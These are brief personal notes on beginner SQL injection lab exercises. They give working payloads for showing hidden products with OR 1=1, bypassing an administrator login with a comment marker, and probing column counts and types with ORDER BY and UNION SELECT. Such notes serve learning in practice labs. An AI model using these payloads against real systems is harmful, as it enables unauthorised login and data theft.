#  Basic SQL Injection Labs:


## Lab 1: Retrieving Hidden Data
**Goal:** Display unreleased products.
* **Payload:** `category=Gifts' OR 1=1--`
* **Explanation:** The query becomes `SELECT * FROM products WHERE category = 'Gifts' OR 1=1` (we can also use 2=2,...)

## Lab 2: Login Bypass
**Goal:** Log in as Administrator without a password.
* **Payload:** Username: `administrator'--`
* **Explanation:**  I use'--' make everything behind it "unimportant" to the database

## Lab 3 & 4: UNION Attack Fundamentals
**Goal:** Determine column count and data types.
* **Step 1 (Count Columns):** `' ORDER BY 1--`, `' ORDER BY 2--`. (with 3 I take error so max = 2)
* **Step 2 (Find Text Column):** `' UNION SELECT 'a', NULL--`, `' UNION SELECT NULL, 'a'--`.(try to find the correct form and I realize that both are ok)
* **Result:** lab success
